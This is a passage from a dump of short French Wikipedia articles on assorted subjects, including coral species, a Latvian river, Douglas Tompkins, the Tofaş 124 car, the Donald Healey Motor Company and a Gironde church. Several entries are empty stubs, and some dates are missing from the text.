 est une série télévisée japonaise diffusée à partir du sur Netflix et par la suite sur les chaînes du groupe Fuji TV et dont Mirei Kiritani est l'actrice principale.
La série n'a pas été doublée en français, mais des sous-titres en anglais, français, espagnol, grec, allemand et hébreu sont proposés.

</doc>
<doc id="9625182" url="https://fr.wikipedia.org/wiki?curid=9625182" title="Flabellum gracile">
Flabellum gracile

Flabellum gracile est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9625188" url="https://fr.wikipedia.org/wiki?curid=9625188" title="Luis González Palma">
Luis González Palma

Luis González Palma, né à Guatemala en 1957, est un photographe guatémaltèque
Il est reconnu comme étant l'un des photographes les plus importants d'Amérique latine.
Biographie.
Luis González Palma naît au Guatemala en 1957. Il étudie l'architecture et la cinématographie à l'université San Carlos de Guatemala.
Il acquiert son premier appareil photographique en 1984, et est rapidement et profondément enthousiasmé par ce qu'il produit. Il cherche à capter la réalité des Guatemaltèques, avec un style cherchant un rendu proche d'une peinture artistique.
Dans ses œuvres, il transmet la souffrance et les expériences des peuples indigènes de son pays.
Il reçoit en 1999 le Gran Premio PHotoEspaña « Baume et Mercier » et collabore avec la mise en scène de la production de l'opéra "The death and the maiden" à l'Opéra de Malmö en 2008.
Œuvres.
Ses œuvres les plus notables sont "La mirada ausente", "Corona de laureles", "El mago" et "Mi caja de música".
Expositions.
Il a été exposé dans de nombreux pays en Amérique du sud, Amérique du nord, en Europe et au Japon.
Conservation.
Son travail est conservé dans plusieurs collections publiques et privées comme :

</doc>
<doc id="9625189" url="https://fr.wikipedia.org/wiki?curid=9625189" title="Aleksandr Maximovitch Berkoutov">
Aleksandr Maximovitch Berkoutov



</doc>
<doc id="9625193" url="https://fr.wikipedia.org/wiki?curid=9625193" title="Aleksandr Berkutov">
Aleksandr Berkutov



</doc>
<doc id="9625198" url="https://fr.wikipedia.org/wiki?curid=9625198" title="Organe de Stewart">
Organe de Stewart

L’Organe de Stewart est le nom donné par les biologistes à l'appareil respiratoire de certains oursins primitifs des ordres des Echinothurioida et Cidaroida.
Description.
L'organe de Stewart est un organe interne entourant la lanterne d'Aristote, de forme buissonnante (comme souvent les organes respiratoires, de manière à augmenter la surface d'échange). À l'instar de la plupart des organes des échinodermes, il est divisé en 5 parties marquées par une symétrie centrale rayonnante. 
Cet organe a été découvert par Stewart en 1879, redécrit par Henri Prouho en 1888 et sa fonction définitivement démontrée par De Ridder en 1988. 
Chez les autres oursins (Euechinoidea) cet organe a régressé, remplacé par des branchies péristomiales. 

</doc>
<doc id="9625203" url="https://fr.wikipedia.org/wiki?curid=9625203" title="Kornelia Moskwa">
Kornelia Moskwa

Kornelia Moskwa est une joueuse de volley-ball polonaise née le . Elle mesure et joue au poste de centrale. 

</doc>
<doc id="9625204" url="https://fr.wikipedia.org/wiki?curid=9625204" title="Berkoutov">
Berkoutov

Berkoutov ("masculin" ; ) ou Berkoutova ("féminin" ; ) est un patronyme russe porté par :

</doc>
<doc id="9625207" url="https://fr.wikipedia.org/wiki?curid=9625207" title="Slocene">
Slocene

La Slocene est une rivière de la province du Zemgale en Lettonie, l'un des affluents de Lielupe. La source de la rivière est située à la frontière des municipalités de Tume et Degole. Le Slocene traverse la municipalité de Tukums, la ville de Tukums, le lac Valgums et se jette dans le lac Kaņieris. La longueur de la rivière est de 44 km.
La rivière s'est formée il y a environ 12 000 à 13 000 ans, lors du retrait des derniers glaciers. À la fin de la période glaciaire, la rivière coulait dans la direction opposée - d'est en ouest, et la Slocène, avec l'Abava, était la plus grande rivière du territoire de la Lettonie moderne. Au stade de la formation, la rivière avait un lit de glace, et c'est alors que se sont formées les terrasses observées aujourd'hui.
La Slocène est utilisée pour produire de l'électricité dans deux centrales hydroélectriques situées dans la région de Tukums, près des villages de Milzkalne et Smārde.

</doc>
<doc id="9625210" url="https://fr.wikipedia.org/wiki?curid=9625210" title="Berkutov">
Berkutov



</doc>
<doc id="9625212" url="https://fr.wikipedia.org/wiki?curid=9625212" title="Berkutova">
Berkutova



</doc>
<doc id="9625213" url="https://fr.wikipedia.org/wiki?curid=9625213" title="Tönissteiner-Colnago">
Tönissteiner-Colnago



</doc>
<doc id="9625215" url="https://fr.wikipedia.org/wiki?curid=9625215" title="Berkoutova">
Berkoutova



</doc>
<doc id="9625222" url="https://fr.wikipedia.org/wiki?curid=9625222" title="George A. Jeckell">
George A. Jeckell

George Allen Jeckell (né le - mort le ) est un éducateur, fonctionnaire et homme politique canadien du Yukon. Professeur à Dawson City et inspecteur du revenu pour l'Agence du revenu du Canada, il a été commissaire du Yukon de 1932 à 1946.
Né à Exeter (Ontario), il est le fils de William Jeckell et d'Essy Case. Il a étudié à Exeter, Goderich ainsi qu'à des écoles normales des Territoires du Nord-Ouest et du Yukon. En 1933, il épouse en secondes noces Anna Theresa Boyle.

</doc>
<doc id="9625231" url="https://fr.wikipedia.org/wiki?curid=9625231" title="Aleksandr Berkoutov">
Aleksandr Berkoutov



</doc>
<doc id="9625232" url="https://fr.wikipedia.org/wiki?curid=9625232" title="Ersatztruppen">
Ersatztruppen



</doc>
<doc id="9625233" url="https://fr.wikipedia.org/wiki?curid=9625233" title="Ersatztruppe">
Ersatztruppe



</doc>
<doc id="9625235" url="https://fr.wikipedia.org/wiki?curid=9625235" title="Léon Maes">
Léon Maes



</doc>
<doc id="9625245" url="https://fr.wikipedia.org/wiki?curid=9625245" title="Tadayoshi Ichida">
Tadayoshi Ichida

, né le à Osaka, est un homme politique japonais.
Membre de la Chambre des conseillers pour le Parti communiste japonais depuis 1998, il est secrétaire général de ce parti de 2000 à 2016.

</doc>
<doc id="9625246" url="https://fr.wikipedia.org/wiki?curid=9625246" title="Tohi à tête olive">
Tohi à tête olive

Le Tohi à tête olive ("Atlapetes flaviceps") est une espèce de passereaux de la famille des Passerellidae.
Répartition.
Il est endémique de la vallée du río Magdalena (Colombie).

</doc>
<doc id="9625248" url="https://fr.wikipedia.org/wiki?curid=9625248" title="Atlapetes flaviceps">
Atlapetes flaviceps



</doc>
<doc id="9625256" url="https://fr.wikipedia.org/wiki?curid=9625256" title="Flabellum hoffmeisteri">
Flabellum hoffmeisteri

Flabellum hoffmeisteri est une espèce de coraux de la famille des Flabellidae.
Étymologie.
Bien que non expressément précisé sur la publication originale, le nom spécifique de cette espèce, "hoffmeisteri", rend très certainement hommage à John Edward Hoffmeister qui a consacré une partie de sa vie à l'étude des coraux. 

</doc>
<doc id="9625265" url="https://fr.wikipedia.org/wiki?curid=9625265" title="Flabellum impensum">
Flabellum impensum

Flabellum impensum est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9625269" url="https://fr.wikipedia.org/wiki?curid=9625269" title="Urmas Kirs">
Urmas Kirs

Urmas Kirs, né le à Viljandi en Estonie, est un footballeur international estonien, devenu entraîneur à l'issue de sa carrière, qui évoluait au poste de défenseur.
Biographie.
Carrière de joueur.
Urmas Kirs dispute un match en Ligue des champions.
Carrière internationale.
Urmas Kirs compte 80 sélections et 5 buts avec l'équipe d'Estonie entre 1992 et 2000. 
Il est convoqué pour la première fois par le sélectionneur national Uno Piir pour un match amical contre la Slovénie le (1-1). Par la suite, le , il inscrit son premier but en sélection contre la Finlande, lors d'un match amical (2-2). Il reçoit sa dernière sélection le contre le Luxembourg (1-1).

</doc>
<doc id="9625272" url="https://fr.wikipedia.org/wiki?curid=9625272" title="Flabellum irregulare">
Flabellum irregulare

Flabellum irregulare est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9625278" url="https://fr.wikipedia.org/wiki?curid=9625278" title="Tifernus">
Tifernus



</doc>
<doc id="9625279" url="https://fr.wikipedia.org/wiki?curid=9625279" title="Il n'y a plus de héros au numéro que vous demandez">
Il n'y a plus de héros au numéro que vous demandez

Il n'y a plus de héros au numéro que vous demandez est un téléfilm fantastique français réalisé par Pierre Chabartier, diffusé en 1980.
Synopsis.
Au début des années 80, Hubert Petit Pont, petit commerçant esseulé, collectionne les objets anciens et insolites. Aux Puces il chine un vieux téléphone de campagne datant de la Grande Guerre. Il le répare et l’utilise. Le téléphone lui permet de communiquer avec un jeune lieutenant d'infanterie encerclé par les allemands, soixante-six ans plus tôt, en 1914. Celui-ci, croyant parler avec l’un de ses supérieurs, lui demande de l'aide. En enquêtant aux archives, à une réunion d'anciens combattants, Hubert Petit Pont retrouve la trace du lieutenant Plantin. Il se prend au jeu et, peu à peu, s'identifie à un général de la Première Guerre mondiale et donne des ordres au jeune lieutenant. 

</doc>
<doc id="9625283" url="https://fr.wikipedia.org/wiki?curid=9625283" title="Flabellum japonicum">
Flabellum japonicum

Flabellum japonicum est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9625289" url="https://fr.wikipedia.org/wiki?curid=9625289" title="Flabellum knoxi">
Flabellum knoxi

Flabellum knoxi est une espèce de coraux de la famille des Flabellidae.

</doc>
<doc id="9625299" url="https://fr.wikipedia.org/wiki?curid=9625299" title="Élections législatives sous la Troisième République">
Élections législatives sous la Troisième République



</doc>
<doc id="9625301" url="https://fr.wikipedia.org/wiki?curid=9625301" title="Flabellum lamellulosum">
Flabellum lamellulosum

Flabellum lamellulosum est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9625312" url="https://fr.wikipedia.org/wiki?curid=9625312" title="Flabellum lowekeyesi">
Flabellum lowekeyesi

Flabellum lowekeyesi est une espèce de coraux de la famille des Flabellidae.
Étymologie.
Son nom spécifique, "lowekeyesi", lui a été donné en l'honneur de T. Peter Lowe et de Ian W. Keyes, collègues des auteurs de cette espèce. 

</doc>
<doc id="9625315" url="https://fr.wikipedia.org/wiki?curid=9625315" title="Tissa (Thuringe)">
Tissa (Thuringe)

Tissa est une commune allemande de l'arrondissement de Saale-Holzland, Land de Thuringe.
Géographie.
La commune comprend le hameau d'Ulrichswalde.
Histoire.
Tissa est mentionné pour la première fois en 1358.

</doc>
<doc id="9625316" url="https://fr.wikipedia.org/wiki?curid=9625316" title="Nicolas Basile Bailly">
Nicolas Basile Bailly

Nicolas Basile Bailly, né à Darney le et mort à Bains-les-Bains le , est un docteur en médecine, inspecteur des Eaux, maire de Bains-les-Bains et conseiller général des Vosges.
Biographie.
Nicolas Basile Bailly est le fils du docteur Pierre Basile Bailly, qui fut chirurgien en chef des armées d'Espagne avant d'être nommé médecin inspecteur des eaux de Bains en 1812 à son retour de la campagne d'Espagne, et de Marie-Anne-Julie Galland. Il est également le petit-fils du chirurgien Nicolas Basile Bailly (1737-1802), dont il porte les prénoms.
Comme son père il sera médecin, il soutient une thèse de doctorat qui a pour titre : "De l'action thérapeutique des eaux thermales simples". Il sera lauréat de l'Académie de médecine dont il reçoit une médaille d'or. En 1844, il prendra la suite de son père comme médecin inspecteur des eaux minérales de Bains où il achète la maison d'un des précédents maires, le baron Pierre Louis Girard.
Il est maire de Bains de 1878 à 1907 et élu au conseil général de 1883 à 1901, il est également le président de l'association des médecins des Vosges et membre du conseil départemental de l'Enseignement primaire. Le docteur Bailly sera fait chevalier de la Légion d'honneur en 1884.
Il publie plusieurs ouvrages scientifiques ainsi que des monographies sur des sujets locaux.
Il avait épousé à Bulgnéville le Marie-Clémentine Morlot, dont il eut 3 enfants.
Il est enterré au cimetière de Bains-les-Bains, sa tombe porte sur le socle une poétique inscription inspirée des vers du poète Nicolas Gilbert, natif du bourg voisin de Fontenoy-le-Château : 
Hommage.
Une avenue de Bains-les-Bains porte son nom.

</doc>
<doc id="9625322" url="https://fr.wikipedia.org/wiki?curid=9625322" title="Montpellier Métropole ASPTT">
Montpellier Métropole ASPTT

Montpellier Métropole ASPTT est un club omnisports membre de la Fédération sportive des ASPTT.
Association loi de 1901, 
Historique.
Le club est créé en 1931 par Léon Cazal avec deux sections : pétanque et football. Dès 1934 est créée la Section TENNIS (TC PTT). À la sortie de la guerre, le président est Benistand et le club compte neuf sections : football, pétanque, athlétisme, basket-ball, cyclisme, gymnastique, natation, tennis et volley-ball.
En 1963, le club achète le terrain où verra le jour le complexe sportif, situé route de Vauguières. Le centre sportif est inauguré en 1967 par le ministre des PTT. En 1967, l'association est élue meilleure ASPTT de France.
Au seuil des , l’ASPTT présente un éventail de quinze sports avec des nouvelles disciplines telles rugby, équitation, karting, handball, tennis de table et ski. De 1969 à 1976, de nouvelles sections sont créées : patinage, bridge, randonnée pédestre, judo et natation synchronisée. La piscine Nakache est inaugurée en 1976. Léon Cazal part à la retraite et laisse sa place à son adjoint Gérard Hugon qui devient le nouveau secrétaire général et régional.
De 1976 à 1991, différents présidents se succèdent (Mrs Cottalorda-Barbou-Robert-Deslandes-Lorin-Archimbaud-Longre) et mettent en place de nouvelles activités : modélisme, cyclotourisme, aïkido, golf, plongée et aquagym. L’ASPTT Montpellier propose alors différentes.
Les années 90 débuteront avec l'organisation du et l'inauguration des terrains de football. Ainsi, l’ASPTT possède alors un complexe sportif de quatre hectares avec gymnase, piscine, deux terrains de football, cinq courts de tennis en terre battue, quatre courts en dur et un club-house. Au niveau sportif, l’ASPTT lance la course internationale cycliste Montpellier-Barcelone. Gérard Hugon part en 1997 et est remplacé par Julien Roussel au poste de secrétaire général et régional. Alain Valentin devient président général.
En 2000, Julien Roussel démissionne et Daniel Delrey le remplace dans ses fonctions de secrétaire général et régional. De nouvelles activités se mettent en place : échecs, théâtre, danses de salon. L'année 2003 est marquée par la cession du patrimoine à la ville de Montpellier et l'arrivée de Bruno Signe, en tant que président général en remplacement d’Alain Valentin.
En 2006, l'ASPTT Montpellier fusionne avec le club de volley Lattes VAC qui devient le LAMVAC. En 2007, le siège social est réhabilité.
En 2008, Daniel Delrey devient président général la même année aux côtés d'Alain Puglièse qui est élu secrétaire général pendant 5 ans. Le club fusionne avec le Tennis club de Grammont (12 terrains en greenset et 2 couverts).
Michel Parache est élu secrétaire général. Une nouvelle activité est proposée : Zumba. En 2014, Alain Heyraud est élu président général en remplacement de Juliette Llahi. En 2015, l’activité marche nordique est proposée.

</doc>
<doc id="9625332" url="https://fr.wikipedia.org/wiki?curid=9625332" title="Douglas Tompkins">
Douglas Tompkins

Douglas Rainsford Tompkins, né le à Conneaut dans l'Ohio (États-Unis) et mort le à Coyhaique (Chili), est un homme d'affaires américain. Il est connu pour avoir cofondé The North Face, une société spécialisée dans les vêtements et accessoires de sport, et Esprit, avec son ex-épouse Susie Tompkins Buell.
Biographie.
Jeunesse.
Douglas Tompkins, fils d'un antiquaire et d'une décoratrice d'intérieur, est né le dans l'Ohio.
Carrière.
Douglas Tompkins est connu pour avoir cofondé The North Face, une société spécialisée dans les vêtements et accessoires de sport, et Esprit, avec son ex-épouse Susie Tompkins Buell. Il est connu également pour son implication dans des causes d'activisme environnemental et la conservation des territoires après avoir quitté le monde des affaires en 1989.
Avec sa femme, Kris Tompkins, il acheta et conserva plus de d'espace naturel en Argentine et au Chili, plus que tout autre particulier habitant dans ces régions, puis devint l'un des plus grands propriétaires terriens privés. Ensemble, ils se concentrent sur la création de parcs naturels, du rétablissement de la nature, de l'agriculture écologique et de l'activisme avec pour objectif de sauver la biodiversité.
Mort.
Le , Tompkins était en train de faire du kayak avec cinq autres personnes sur le lac Buenos Aires/General Carrera dans le sud du Chili lorsque des vagues assez fortes firent chavirer leurs embarcations. Tompkins passa un temps considérable dans une eau à moins de . Il fut héliporté à proximité à l’hôpital de Coyhaique, où il mourut à cause d'une sévère hypothermie. Il avait 72 ans.
Donation de terres.
Au mois de mars 2017, sa veuve cède au Chili 407 625 hectares sur les 550 000 que le couple avait achetés. Ces terres serviront à la constitution de trois parcs nationaux. C'est à ce jour la plus grande donation de terre privée de l'histoire.

</doc>
<doc id="9625333" url="https://fr.wikipedia.org/wiki?curid=9625333" title="Colette Broïdo">
Colette Broïdo

Colette Broïdo est une actrice française d'origine russe née le à Moscou et morte le dans le .
Biographie.
Jeunesse et famille.
Maria Theresa Yvonna Broïdo naît à Moscou, fille de l'architecte russe Hermann Broïdo et d'une mère française, Angèle Gabrielle Legrand. Elle se réfugie avec sa famille en Suisse, d'abord à Bâle puis à Genève, après la révolution de 1917.
En 1921, établie à Paris, elle épouse Marius Edmond Victor Rouzée, secrétaire de casino. Après leur divorce en 1929, elle se remarie avec Frantz Zumbiehl.
Son frère, Jacques Broïdo (1908-1987), a été un proche collaborateur de Jacques Tati.
Carrière.
C'est à Genève qu'elle va faire son apprentissage de comédienne, en montant sur la scène de la Comédie de Genève dès le début des années 1920, sous le nom de Colette Broïdo.
La suite de sa carrière se fait en France, d'abord en province avec les Tournées Charles Baret, puis à Paris à partir du début des années 1930. En 1932, elle interprète son premier rôle au cinéma dans un film de Robert Bibal. Elle y reprend le même personnage que dans la pièce qui s'en inspire et qu'elle a joué quelques mois auparavant au théâtre de la Potinière. Elle ne joue que dans 7 films, tous réalisés par Robert Bibal ou par Maurice de Canonge. Colette Broïdo quitte définitivement les plateaux de cinéma en 1936 pour se spécialiser dans le doublage. Elle double notamment les actrices Carole Lombard, Paula Wessely et Ilse Werner.
Colette Broïdo meurt prématurément en 1941, dans son appartement du 5, rue Nicolas-Chuquet.

</doc>
<doc id="9625349" url="https://fr.wikipedia.org/wiki?curid=9625349" title="Tofaş 124">
Tofaş 124

La Tofaş 124 Murat est la version turque de la Fiat 124 italienne, construite sous licence en Turquie, entre 1971 et 1977. Elle renait sous le nom de Tofaş Serçe de 1985 à 1995.
Histoire.
Jusqu'au milieu des années 1960, la Turquie n'avait aucun constructeur automobile. Le pays devait importer tous ses moyens de transport. Le gouvernement de l'époque voulut doter le pays d'une industrie très pourvoyeuse de main d'œuvre, abondante dans ce pays jeune. 
La famille Koç engagea une coopération avec Gianni Agnelli, patron de Fiat qui déboucha sur la création de la société Tofaş ("Türk Otomobil Fabrikası Anonim Şirketi") qui est le premier constructeur automobile turc. L'usine de production de Bursa a été construite sur le modèle réduit de l'usine italienne Mirafiori à partir d' et deviendra opérationnelle en . Sa capacité initiale était de 20.000 voitures par an.
La "'Tofaş 124 Murat" est le premier modèle automobile turc construit entièrement en Turquie. La production en série a débuté le à partir du modèle original italien Fiat 124. 
La version turque ne diffère que par le logo Tofaş de couleur rouge placé au centre de la calandre en lieu et place du logo Fiat. Sur la version "Serçe", le logo est déplacé en bas à droite de la calandre.
La "124 Murat" sera le seul modèle fabriqué par le constructeur jusqu'en 1976 avec l'arrivée de la Tofaş 131 qui la remplaça immédiatement. Sa fabrication pris fin le . La capacité de l'usine a alors été portée à 35.000 unités par an.
C'était sans compter sur la volonté de la clientèle turque qui était très heureuse de pouvoir s'offrir une voiture spacieuse et d'un coût très raisonnable. Le modèle 131 qui l'avait remplacé, était encore plus spacieux mais d'un prix d'achat plus élevé. Les ventes de la Tofaş 131 étant à la peine dans un marché en pleine expansion, la direction turque dû se résoudre à réintroduire la 124 renommée Serçe en 1984. Elle fera office de modèle d'entrée de gamme "low cost" jusqu'en 1994, où elle quittera définitivement la scène. La "Serçe" différait très légèrement de la version 124 Murat au niveau des faces avant avec des phares rectangulaires à la place des ronds d'origine et des feux arrière dédoublés. Aucun élément de carrosserie ne fut modifié. La finition intérieure fut également revue, sans gros changement dans l'équipement toutefois.
Caractéristiques techniques.
Les Tofaş 124 Murat et Serçe reposent sur le modèle Fiat 124 et n'en diffèrent sur aucun point technique. Moteur Fiat type 124 de placé longitudinalement à l'avant d'une puissance de 65 ch DIN lui garantissant une vitesse maximale de 170 km/h avec une boîte de vitesses à 4 rapports entièrement synchronisés.
Conçue au début des années 1960, la Fiat 124 était une berline traditionnelle à 4 portes. Elle restait fidèle aux solutions mécaniques classiques : propulsion avec un essieu rigide, mais avec des ressorts et des amortisseurs coaxiaux, une ligne à trois volumes très carrée qui se voulait, selon les critères de l'époque, très moderne. Le moteur, un nouveau 4 cylindres monoarbre à cames de développant 65 ch DIN, lui fournissait de bonnes prestations () et une consommation très modérée. 
Le succès auprès du public comme de la critique fut immédiat. La Fiat 124 se vit attribuer le prix de Voiture de l'Année en 1967.
Production de la Fiat 124.
La Fiat 124 est la voiture du géant turinois la plus produite dans l'absolu :

</doc>
<doc id="9625366" url="https://fr.wikipedia.org/wiki?curid=9625366" title="Melchior de Marconnay">
Melchior de Marconnay

Melchior de Marconnay (mort le ) est évêque élu de Dol en 1592 puis évêque de Saint-Brieuc de 1601 à sa mort.
Biographie.
Melchior de Marconnay est issu d'une famille noble du Poitou. Il est le fils de Pierre de Marconnay, premier maître d'hôtel de la reine Catherine de Médicis et de Louise (ou Catherine) de Sousmoulins. Il est pourvu en commende en 1578 de l'abbaye Notre-Dame de Sept-Fontaines dans le diocèse de Reims puis en 1581 de celle de Saint-Pierre de Rillé dans le diocèse de Rennes. 
En 1592 après la mort de Charles d'Espinay, le chapitre de chanoines de Dol de Bretagne l'élit évêque, puis entreprend des démarches pour le faire officiellement nommer évêque de Dol, mais elle demeurent sans suite. Il est en effet, pendant les troubles de la Ligue en Bretagne, l'un des partisans actifs et conseillers de Philippe-Emmanuel de Lorraine, duc de Mercœur. 
Il est cependant désigné en janvier 1601 comme évêque de Saint-Brieuc dont le siège est vacant depuis plus de cinq années. Il est nommé en novembre, et consacré l'année suivante par Charles de Balsac évêque de Noyon. Il préside la session des États de Bretagne qui se tiennent à Saint-Brieuc en 1602 et en 1605. Il fonde le collège de la ville et y introduit les Capucins en 1615. En août 1614 il est parmi les représentants de la province de Bretagne lors des États généraux. Il meurt après trois jours d'une forte fièvre le .

</doc>
<doc id="9625368" url="https://fr.wikipedia.org/wiki?curid=9625368" title="Pandolfo II Malatesta">
Pandolfo II Malatesta

Pandolfo II Malatesta (1325  – Pesaro )  est un condottiere italien.
Biographie.
Fils de  Malatesta III Malatesta, il combat auprès de Werner von Urslingen et Gil de Albornoz. Par la suite il rentre au service de Galeazzo II Visconti  de Milan,  mais s'attirant la jalousie de Bernabò Visconti il rejoint les  Marches puis entre au service de Florence contre Pise combattant contre John Hawkwood.

</doc>
<doc id="9625374" url="https://fr.wikipedia.org/wiki?curid=9625374" title="Ouvrage du Champ-de-Tir">
Ouvrage du Champ-de-Tir



</doc>
<doc id="9625380" url="https://fr.wikipedia.org/wiki?curid=9625380" title="Donald Healey Motor Company">
Donald Healey Motor Company

Donald Healey Motor Company Limited était un constructeur automobile britannique.
Histoire.
La société Donald Healey Motor a été fondée en 1945 par Donald Healey, célèbre pilote de rallye et ingénieur automobile britannique. Pendant la Deuxième Guerre mondiale, il fait la rencontre de Achille Sampietro, un spécialiste de châssis pour voitures hautes performances, et , un ingénieur carrosserie, avec lesquels il discute de conception de voitures sportives.
Healey motorcars.
Le marché visé par Healey avec sa nouvelle entreprise était celui des véhicules premiums, luxueux et performants. Il installa ses ateliers dans une ancienne usine de fabrication de pièces pour l'industrie aéronautique, située dans les environs de Miller Road à Warwick.
Il fut rejoint par la suite par Roger Menadue qui, après avoir longtemps travaillé chez Armstrong Whitworth, prit la direction de l'atelier. Plus tard, Healey installa un showroom sur l'emplacement d'un ancien cinéma sur Emscote Road, à Warwick. Ce showroom a disparu depuis, remplacé par une résidence baptisée "Healey Court".
Les voitures étaient généralement équipées d'une version spécifique du bloc Riley 4 cylindres à double arbres à cames de , monté sur un châssis maison en acier léger, et muni d'une suspension avant indépendante constituée de ressorts hélicoïdaux, de bras oscillants en alliage et d'amortisseurs Girling de Lucas Industries. La suspension arrière était dotée d'un pont rigide et de ressort hélicoïdaux. La conception soignée et les réglages optimisés de l'ensemble assurait au véhicule un amortissement doux et une très bonne tenue de route. Le freinage était assuré par des freins hydrauliques Lockheed.
À son arrivée en 1948, la berline Elliott revendiqua le titre de la voiture de série à habitacle fermé la plus rapide au monde, en étant capable d'atteindre la vitesse de sur un 1,6 km. Le dessin de la carrosserie était l'œuvre de qui, chose unique pour l'époque, en avait longuement optimisé le profil en soufflerie pour une meilleure efficacité aérodynamique. Ce fut le début du design aérodynamique des carrosseries permettant de réduire la traînée, qui culmina plus tard avec le projet Zethrin Rennsport. En 1949, la plus sportive des Healey était annoncée : la Silverstone. Dotée d'un châssis court et d'une suspension rigide, elle était capable d'atteindre . La Silverstone reporta plusieurs victoires en compétitions, la Coupe des Alpes en 1947 et 1948 et les Mille Miglia en 1949. Très rare car fabriqué en peu d'exemplaires, ce modèle est très recherché ; beaucoup d'autres modèles Healy ont été convertis en répliques de Silverstone.
Nash-Healey.
Dans le cadre de la politique gouvernementale britannique de contrôle et de planification de l'après-guerre, il était requis des acteurs industriels qui augmenteraient de manière substantielle leur production de réserver une partie de cette augmentation au marché de l'exportation. Par conséquent, Healy fit développer un nouveau modèle de véhicule, le Nash-Healey, motorisé par le bloc Nash Ambassador équipé du et d'une transmission Nash. Équipé à l'origine d'un bloc de , le Nash-Healey reçu, à l'occasion du transfert en 1952 de l'atelier de montage chez Pininfarina, un nouveau bloc de .
Chiffres de production.
Le dernier modèle de véhicule construit par Healey fut le type G à moteur et boîte Alvis. Plus luxueux et plus lourd que les autres modèles Healey à moteur Riley, le type G souffrait d'un déficit de performance.
Austin-Healey.
Healey estima que l'avenir de la société passait par le développement d'une sportive financièrement plus abordable, donc vendue à plus large échelle, et positionnée entre les modèles de MG et de Jaguar, qui se vendaient bien aux États-Unis. Aidé de son fils aîné Geoffrey et installés dans le grenier de la maison familiale, Healey conçu un roadster 2 places empruntant de nombreux composants bon marché de la marque Austin. Le prototype exposé au salon Earls Court Motor Show de 1952 impressionna le patron d'Austin, Sir Leonard Lord, il proposa alors de d'en lancer la construction dans ses propres usines, sous le nom Austin-Healey, ce qui donna naissance à la Austin-Healey 100.
En 1953, une coentreprise est créée, donnant naissance à British Motor Corporation, qui prit en charge la fabrication des Austin-Healey. Le modèle 100 reçut des évolutions donnant finalement le très apprécié et très convoité par les collectionneurs modèle 3 litres Austin-Healey 3000, suivi du roadster bas prix Sprite de , affectueusement surnommé « frog-eye » (yeux de grenouille) (et aussi « Bugeye » aux États-Unis).
Dans un article sur la 3000 publié après la mort de Donald Healey, The Times écrit : ().
Jensen-Healey.
Donald Healey prit la direction de Jensen Motors à la fin des années 1960 et il en résultat en 1972 le cabriolet sport à motorisation Lotus.
Cession.
Donald Healey Motor Company fut finalement cédée à Hamblin Group, à l'exception des divisions chargées du conseil (Healey Automobile Consultants) et de l'ingénierie, restées sous le contrôle de Geoffrey et Donald Healey.

</doc>
<doc id="9625382" url="https://fr.wikipedia.org/wiki?curid=9625382" title="Un tour de manège">
Un tour de manège

Un tour de manège est un film français réalisé par Pierre Pradinas, et sorti en 1989.

</doc>
<doc id="9625384" url="https://fr.wikipedia.org/wiki?curid=9625384" title="20 octobre 1894">
20 octobre 1894



</doc>
<doc id="9625397" url="https://fr.wikipedia.org/wiki?curid=9625397" title="Compagnies franches de la Marine à Plaisance">
Compagnies franches de la Marine à Plaisance

Les Compagnies franches de la Marine à Plaisance sont un détachement de les Compagnies franches de la marine envoyé par Louis de Buade de Frontenac pour y tenir garnison. En 1687, on note un officier et 25 soldats. Quatre ans plus tard, il y a 40 soldats et un officier. En 1696, il y a neuf officiers et 150 soldats qui s'y trouvent, et on réorganise les troupes de façon qu'elles soient conformes au modèle colonial habituel, chaque compagnie ayant un capitaine, un lieutenant, un enseigne, deux sergents, deux caporaux, deux anspessades et 44 soldats, dont un tambour. Il semble que ce n'ait pas été le cas des compagnies de Plaisance où il est fréquent qu'elles soient incomplètes. Par exemple, en 1690, on rapporte que neuf soldats seulement sont en devoir, les autres étant devenus pêcheurs ou travaillant chez les habitants. , des recrues arrivent l'année suivante. Les effectifs sont presque remplis par la suite. Ils sont 129 soldats en 1698, 150 en 1703 et 144 en 1708. À cette garnison coloniale s'ajoutent par moments des renforts métropolitains: quatre Compagnies franches de la Marine, provenant de Rochefort et totalisant 200 soldats, sont envoyées à Terre-Neuve en 1709. Dès l'année suivante, cependant, trois repassent en France. En 1711, le transfert vers Plaisance de deux compagnies de l'Acadie, à la suite de la chute de Port-Royal, porte la garnison à 250 soldats.
Voir aussi.
Militaires de la Nouvelle-France

</doc>
<doc id="9625398" url="https://fr.wikipedia.org/wiki?curid=9625398" title="Église Saint-Pierre de Puisseguin">
Église Saint-Pierre de Puisseguin

L'église Saint-Pierre est une église catholique située à Puisseguin, dans le département français de la Gironde en France. Elle dépend du Secteur Pastoral de Saint-Émilion.
À la suite de problèmes au niveau de la voûte et pour des raisons de sécurité, l’église est maintenue fermée entre novembre 2022 et octobre 2023. À cette date, elle réouvre après avoir subi des travaux d’étaiement, qui ont installé une imposante charpente en bois permettant de stabiliser l’édifice. 
Localisation.
L'église se trouve au centre du bourg, sur la route départementale D17.&lt;mapframe latitude="44.92308" longitude="-0.07311" zoom="19" width="399" height="267" align="center" /&gt;
Description et historique.
Il s’agit d’un édifice d’origine romane, datant de la fin du , puis modifié et agrandi au . Il ne reste de la première période que la partie basse de la façade (le portail polylobé) et les deux premières travées de la nef dont les murs ont été surélevés et les fenêtres transformées. La seule baie romane qui subsiste est au nord de la première travée. Le chœur gothique est de la fin du . Il est voûté d'ogives qui retombent sur des chapiteaux ornés de feuilles de vigne.
Le sanctuaire ajouté au possède une voûte d'arête à nervures. Il est fermé, à l'ouest, par un chevet plat percé d'une fenêtre à meneau. 
De plan en croix latine, la nef se compose de deux travées voutées respectivement en berceau brisé, puis en plein cintre. Deux chapelles voutées en berceau rajoutées en 1786 forment les bras du transept. Au nord la chapelle est dédiée à la Vierge et au sud à saint Clair. La sacristie sur le flanc sud du chevet date aussi de ce remaniement. Le chevet plat, épaulé par deux épais contreforts en biais, est voûté d’ogives. Le clocher néoclassique se tient sur la façade occidentale.
Le portail ancien est enfermé dans un porche moderne. Il se compose d'une porte centrale flanquée de deux fausses portes. La porte centrale, à redents, présente des chapiteaux jumelés et des tailloirs. La partie haute de la façade a été refaite à l'époque moderne.
